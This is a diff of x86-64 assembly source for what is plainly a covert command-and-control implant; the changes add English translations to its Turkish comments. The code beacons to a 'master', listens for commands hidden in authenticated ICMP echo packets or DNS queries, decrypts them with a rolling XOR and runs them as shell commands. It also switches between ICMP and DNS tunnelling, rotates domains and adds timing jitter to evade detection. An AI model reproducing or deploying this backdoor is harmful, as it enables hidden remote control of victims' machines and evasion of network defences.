@@ -73,7 +73,7 @@ _start:
     ; ================================================================
     ; Network Protocol Router (VTABLE) Setup
     ; ================================================================
-    ; Agent starts as icmp. (PIC uyumlu olması için 'rel' kullanıyoruz)
+    ; Agent starts as icmp using 'rel' for PIC compatibility. (PIC uyumlu olması için 'rel' kullanıyoruz)
     
     lea rax, [rel _icmp_init]
     mov [rbp + 0x3000], rax       ; Network protocol function
@@ -92,42 +92,42 @@ _start:
     ; argv_array copy  -> [rsp + 0x1200]
     ; icmp_packet'i Stack'e taşı 
     lea rsi, [rel icmp_packet]  ; .data'daki orijinal şablon (Sadece okunur, sorun yok)
-    lea rdi, [rbp + 0x100]     ; Stack'teki yeni yerimiz (Okunur ve Yazılır!)
-    mov rcx, 88                 ; Paketin boyutu
+    lea rdi, [rbp + 0x100]     ; Our new spot on stack (WRITE and READ) / Stack'teki yeni yerimiz (Okunur ve Yazılır!)
+    mov rcx, 88                 ; Packet size  (88) ICMP / Paketin boyutu
     rep movsb
-    ; delay_req'i Stack'e taşı
+    ; move delay_req to stack / delay_req'i Stack'e taşı
     lea rsi, [rel delay_req]
     lea rdi, [rbp + 0x1100]
-    mov rcx, 32                 ; 4 adet 8 baytlık qword (req ve rem)
+    mov rcx, 32                 ; 4 x 8-byte qwords (req and rem) / 4 adet 8 baytlık qword (req ve rem)
     rep movsb
     ; Step 2: Create a new session
     mov rax, 112                ; sys_setsid
     syscall
-	; Step 3: Ağ Modülünü Başlat (Hangi protokol VTable'da ise o çalışır)
+	; Step 3: Starting Network module / Ağ Modülünü Başlat (Whichever protocol is in the VTable is the one that executes.)
     call [rbp + 0x3000]
     
     ; --- First Beacon hello packet / İLK BEACON (MERHABA PAKETİ) ---
-    mov r12, 0              ; Payload boyutu 0 olsun (Boş paket)
-    call [rbp + 0x3010]     ; VTable Index 2: _send çağır! (Master'a sinyal gider)
+    mov r12, 0              ; Payload size is 0 (empty packet) / Payload boyutu 0 olsun (Boş paket)
+    call [rbp + 0x3010]     ; VTable Index 2: _send call (send master to signal)/ _send çağır! (Master'a sinyal gider)
     ; -----------------------------------
     
 _sniff:
-	call [rbp + 0x3008]     ; VTable'dan Dinleme Fonksiyonunu Çağır (ICMP veya DNS)
-    test rax, rax           ; RAX 0 döndüyse paket geçersizdir
-    jz _sniff               ; Geçersizse tekrar dinlemeye dön
+	call [rbp + 0x3008]     ; call listening func from VTABLE (ICMP or DNS ) / VTable'dan Dinleme Fonksiyonunu Çağır (ICMP veya DNS)
+    test rax, rax           ; if rax returned 0 packet is invlaid / RAX 0 döndüyse paket geçersizdir
+    jz _sniff               ; if invlaid go back to listening / Geçersizse tekrar dinlemeye dön
     
     ; --- DECRYPTION & OFFSET HANDLING ---
-    mov r14, rax                    ; RAX'ta payload boyutu var
-    lea rsi, [rbp + 0x2000 + 52]    ; Veri adresini al
+    mov r14, rax                    ; rax has the payload size / RAX'ta payload boyutu var
+    lea rsi, [rbp + 0x2000 + 52]    ; take the data adress / Veri adresini al
     mov rcx, r14
-    call _xor_cipher                ; şifreyi çöz
+    call _xor_cipher                ; decrypt / şifreyi çöz
     
     ; --- AGENT PIVOT CONTROL --
-    cmp byte [rsi], '!'   ; Komut '!' ile mi başlıyor? (Özel komut işareti)
-    jne _execute_command  ; Değilse normal shell komutudur, devam et.
+    cmp byte [rsi], '!'   ; check if the command starts with !(speacial command pivoting) / Komut '!' ile mi başlıyor? (Özel komut işareti)
+    jne _execute_command  ; if not its an shell command contiune / Değilse normal shell komutudur, devam et.
     
-    ; Eğer '!' ise pivot kontrolü yap
-    cmp byte [rsi + 1], 'D' ; !D (DNS'e geç anlamında basit bir check)
+    ; if command '!' check pivot control / Eğer '!' ise pivot kontrolü yap
+    cmp byte [rsi + 1], 'D' ; !D (pivot to DNS) / !D (DNS'e geç anlamında basit bir check)
     je _switch_to_dns
     
     cmp byte [rsi +1], 'I'
@@ -136,10 +136,10 @@ _sniff:
     ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
     mov [rbp + 0x1200 + 16], rsi
 	mov rdx, r14                     
-    push rdx                        ; Yazdırma / döngü işlemleri için boyut koruması
+    push rdx                        ; protection for the write-loop processes / Yazdırma-döngü işlemleri için boyut koruması
     push rsi                        
 
-    jmp _execute_command            ; Execve'ye jmpla
+    jmp _execute_command            ; jump to execve / Execve'ye jmpla
 _wait_for_child:
     mov rax, 61                     ; sys_wait4
     mov rsi, 0                      
@@ -290,11 +290,11 @@ _xor_cipher:
     test rcx, rcx                   
     jz .done                        
     push rsi                        
-    push rdx                        ; DL kullanacağımız için RDX'i koruyalım
-    mov dl, 0x42                    ; Başlangıç anahtarı (Seed)
+    push rdx                        ; we gonna use DL so we have to protect the RDX / DL kullanacağımız için RDX'i koruyalım
+    mov dl, 0x42                    ; First key / Başlangıç anahtarı (Seed)
 .loop:
-    xor byte [rsi], dl              ; Baytı mevcut anahtarla XOR'la
-    add dl, 0x07                    ; Her adımda anahtarı 7 artır (Rolling etkisi)
+    xor byte [rsi], dl              ; xor'ing the byte with current key / Baytı mevcut anahtarla XOR'la
+    add dl, 0x07                    ; increase the key +7 for every step (rolling xor) / Her adımda anahtarı 7 artır (Rolling etkisi)
     inc rsi                         
     loop .loop                      
     pop rdx                         
@@ -377,15 +377,15 @@ _vesqer_compress:
     cmp r8b, 255
     jne .comp_loop
 .comp_flush_255:
-    mov byte [rdi], r8b      ; 255'i yaz
+    mov byte [rdi], r8b      ; write 255 / 255'i yaz
     inc rdi
-    mov byte [rdi], r9b      ; Mevcut deltayı yaz
+    mov byte [rdi], r9b      ; write the current delta / Mevcut deltayı yaz
     inc rdi
     
     ; --- [YENİ: SIFIRLAMA MANTIĞI] ---
-    mov r8b, 0               ; Sayacı sıfırla (Bir sonraki lodsb 1 yapacak)
-    ; Anchor (bl) zaten rsi'daki karakterle aynı, dokunma!
-    jmp .comp_loop           ; Hiçbir şeyi atlamadan döngüye dön
+    mov r8b, 0               ; reset the counter(r8b) next lodsb will do it 1 / Sayacı sıfırla (Bir sonraki lodsb 1 yapacak)
+    ; Anchor (bl) is same as rsi dont touch it / Anchor (bl) zaten rsi'daki karakterle aynı, dokunma!
+    jmp .comp_loop           ; Go back to the loop without skipping anything./ Hiçbir şeyi atlamadan döngüye dön
 .comp_flush:
     mov byte [rdi], r8b
     inc rdi
@@ -432,10 +432,10 @@ _lcg_jitter:
     push r15
 
     rdtsc                           ; EAX = TSC düşük 32 bit
-    imul eax, eax, 1664525          ; LCG karıştırma (entropi arttırır)
+    imul eax, eax, 1664525          ; increasing the entropy LCG / LCG karıştırma (entropi arttırır)
     add  eax, 1013904223
 
-    xor  edx, edx                   ; div için EDX:EAX hazırla
+    xor  edx, edx                   ; for the div operation xor the edx / div için EDX:EAX hazırla
     mov  ecx, 900000000             ; mod 900M  → [0, 900M)
     div  ecx
     add  edx, 100000000             ; +100M → [100ms, 1000ms)
@@ -450,7 +450,7 @@ _lcg_jitter:
     xor  rsi, rsi                   ; rem = NULL
     syscall
 
-    add  rsp, 32                    ; stack temizle
+    add  rsp, 32                    ; clear the stack (fixing the stack sliding) / stack temizle
 
 	pop r15
     pop r14
@@ -486,10 +486,10 @@ _icmp_init:
     ret
 
 _icmp_send:
-    ; --- ICMP'ye ÖZEL ÖN HAZIRLIK ---
-	call _create_seq_id         ; Paketin ID ve SEQ numaralarını (Auth) basar
-    call _checksum_cal          ; Paketin checksum'ını hesaplar ve mühürler
-    ; --- GÖNDERME İŞLEMİ ---
+    ; --- ICMP SPECIAL PRELIMINARY PREPARATION / ICMP'ye ÖZEL ÖN HAZIRLIK ---
+	call _create_seq_id         ; It prints the packet ID and SEQ numbers (Auth). / Paketin ID ve SEQ numaralarını (Auth) basar
+    call _checksum_cal          ; calculate the packet checksum and seals it / Paketin checksum'ını hesaplar ve mühürler
+    ; ---  SENDING OPERATION / GÖNDERME İŞLEMİ ---
     mov rax, 44                 ; sys_sendto
     mov edi, dword [rbp + 0x10] 
     lea rsi, [rbp + 0x100]      
@@ -499,10 +499,10 @@ _icmp_send:
     mov r9, 16               
     syscall
 
-    ; --- ICMP'YE ÖZEL JITTER ---
+    ; --- JITTER FOR THE ICMP / ICMP'YE ÖZEL JITTER ---
 	call _lcg_jitter
 
-; --- ICMP ÖZEL: ID/SEQ Üretimi ---
+; --- CREATING ID/SEQ FOR THE ICMP / ICMP ÖZEL: ID/SEQ Üretimi ---
 _create_seq_id:
     rdtsc
     xor edx, edx
@@ -517,7 +517,7 @@ _create_seq_id:
     mov word [rbp + 0x100 + 6], ax
     ret
 
-; --- ICMP ÖZEL: Checksum Hesaplama ---
+; --- CALC THE ICMP PACKET CHECKSUM / ICMP ÖZEL: Checksum Hesaplama ---
 _checksum_cal:
     mov word [rbp + 0x100 + 2], 0          
     xor rcx, rcx                    
@@ -576,11 +576,11 @@ _icmp_recv:
     cmp rax, 52
     jb .invalid_packet
 
-    ; Type 8 (Echo Request) kontrolü
+    ; Type 8 (Echo Request) control/kontrolü
     cmp byte [rbp + 0x2000 + 20], 8
     jne .invalid_packet
 
-    ; 4. Asimetrik ID CONFIRMATION (Master Auth: ID + SEQ = 45000)
+    ; 4. Asymmetric / Asimetrik ID CONFIRMATION (Master Auth: ID + SEQ = 45000)
     movzx ebx, word [rbp + 0x2000 + 26] ; Take Seq
     xchg bl, bh                         ; Endianness fix
     movzx ecx, word [rbp + 0x2000 + 24] ; Take ID
@@ -641,27 +641,27 @@ _dns_send:
     push rdi                        ; length byte pozisyonu
     inc rdi
 
-    lea rsi, [rbp + 0x100 + 32]     ; XOR'lanmış data
-    mov rcx, r12                    ; byte sayısı (max 35)
-    call _dns_encode                ; rax = yazılan char sayısı
+    lea rsi, [rbp + 0x100 + 32]     ; XORRED DATA / XOR'lanmış data
+    mov rcx, r12                    ; byte count (max 35) / byte sayısı (max 35)
+    call _dns_encode                ; rax = written char count / rax = yazılan char sayısı
 
     pop rbx
-    mov byte [rbx], al              ; length byte yaz
+    mov byte [rbx], al              ; write lenght of the byte / length byte yaz
 
 .skip_encode:
     
 ; === 3. DOMAIN (rotation) ===
-    mov rax, [rbp + 0x3020]        ; mevcut index
+    mov rax, [rbp + 0x3020]        ; current index / mevcut index
     mov rcx, rax
     inc rax
     cmp rax, 5
     jne .no_reset
     xor rax, rax
 .no_reset:
-    mov [rbp + 0x3020], rax        ; index güncelle
-    imul rcx, rcx, 20              ; offset hesapla
+    mov [rbp + 0x3020], rax        ; update index / index güncelle
+    imul rcx, rcx, 20              ; calc offset / offset hesapla
     lea rsi, [rel domain_pool]
-    add rsi, rcx                   ; domain seç
+    add rsi, rcx                   ; pick domain / domain seç
 .copy_domain:
     lodsb
     stosb
@@ -721,11 +721,11 @@ _dns_recv:
     test al, al
     jz .invalid_packet
 
-    movzx rcx, al                       ; char sayısı
+    movzx rcx, al                       ; char count / char sayısı
 
     push rcx
     lea rdi, [rbp + 0x2000 + 300]
-    call _dns_decode                    ; rax = byte sayısı
+    call _dns_decode                    ; rax = byte count / rax = byte sayısı
     pop rcx
 
     ; bridge 300 → 52
@@ -820,9 +820,9 @@ _dns_decode:
     push r14
     push r15
 
-    mov r15, rcx                ; char sayısı
+    mov r15, rcx                ; char count / char sayısı
     imul rcx, rcx, 5
-    shr rcx, 3                  ; byte sayısı
+    shr rcx, 3                  ; byte count / byte sayısı
     mov r14, rcx
 
     xor rbx, rbx
@@ -835,8 +835,8 @@ _dns_decode:
     lodsb
     dec r15
 
-    cmp al, 'a'         ; 0x61 - doğru eşik
-    jae .is_alpha       ; >= 'a' ise letter
+    cmp al, 'a'         ; 0x61 - correct threshold / doğru sınır
+    jae .is_alpha       ; >= 'a' if letter /ise letter
     sub al, '2'         ; digit '2'-'7'
     add al, 26
     jmp .got_val
@@ -882,7 +882,7 @@ _switch_to_dns:
     mov edi, dword [rbp + 0x10]
     syscall
 
-    ; 2. VTable'ı DNS adresleriyle OVERWRITE et!
+    ; 2. OVERWRITE THE VTABLE with DNS ADRESSES / VTable'ı DNS adresleriyle OVERWRITE et
     lea rax, [rel _dns_init]
     mov [rbp + 0x3000], rax
     lea rax, [rel _dns_recv]
@@ -891,21 +891,21 @@ _switch_to_dns:
     mov [rbp + 0x3010], rax
 
 
-    ; 3. Yeni protokolü başlat ve dinlemeye dön
+    ; 3. Start the new protocol and keep listening /  Yeni protokolü başlat ve dinlemeye dön
     call [rbp + 0x3000]
     
-    call _lcg_jitter        ; Master'ın hazırlanması için 1 sn bekle
-    mov r12, 0              ; Boş beacon
-    call [rbp + 0x3010]     ; _dns_send çağır!
+    call _lcg_jitter        ; wait for master 1 second / Master'ın hazırlanması için 1 sn bekle
+    mov r12, 0              ; enoty beacon / Boş beacon
+    call [rbp + 0x3010]     ; call _dns_send / _dns_send çağır!
     jmp _sniff
 
 _switch_to_icmp:
-    ; 1. Eski soketi kapat (Açık olan DNS UDP soketini öldür)
+    ; 1. Close the old socket / Eski soketi kapat (Açık olan DNS UDP soketini öldür)
     mov rax, 3              ; sys_close
     mov edi, dword [rbp + 0x10]
     syscall
 
-    ; 2. VTable'ı ICMP adresleriyle OVERWRITE et!
+    ; 2. OVERWRITE THE VTABLE with ICMP ADRESSES / VTable'ı ICMP adresleriyle OVERWRITE et!
     lea rax, [rel _icmp_init]
     mov [rbp + 0x3000], rax
     lea rax, [rel _icmp_recv]
@@ -913,10 +913,10 @@ _switch_to_icmp:
     lea rax, [rel _icmp_send]
     mov [rbp + 0x3010], rax
 
-    ; 3. Yeni protokolü (ICMP) başlat
-    call [rbp + 0x3000]     ; _icmp_init çalışır ve yeni Raw Socket açılır
+    ; 3. start the new protocol (ICMP) / Yeni protokolü (ICMP) başlat
+    call [rbp + 0x3000]     ; creating new socket / _icmp_init çalışır ve yeni Raw Socket açılır
     
-    ; 4. ICMP Beacon atmaz! Direkt pusuya (sniff) yatar.
+    ; 4. No ICMP beacon just sniffing directly / ICMP Beacon atmaz! Direkt pusuya (sniff) yatar.
 
     jmp _sniff
 
